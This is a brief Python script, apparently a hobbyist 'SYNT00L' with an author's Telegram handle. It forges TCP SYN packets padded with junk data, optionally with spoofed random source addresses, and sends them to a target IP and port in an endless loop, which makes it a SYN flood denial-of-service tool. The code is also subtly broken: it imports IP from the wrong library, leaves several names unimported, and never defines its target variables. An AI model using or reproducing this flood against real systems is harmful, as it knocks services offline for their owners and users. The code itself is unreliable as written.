print ("SYNT00L by Vicky(telegram-@i_am_vicky_8055)")
import scapy
from IPy import IP


# forge IP packet with target ip as the destination IP address
ip = IP(dst=target_ip)
# or if you want to perform IP Spoofing (will work as well)
# ip = IP(src=RandIP("192.168.1.1/24"), dst=target_ip)

# forge a TCP SYN packet with a random source port
# and the target port as the destination port
tcp = TCP(sport=RandShort(), dport=target_port, flags="S")

# add some flooding data (1KB in this case)
raw = Raw(b"X"*1024)

# stack up the layers
p = ip / tcp / raw
# send the constructed packet in a loop until CTRL+C is detected 
send(p, loop=1, verbose=0)
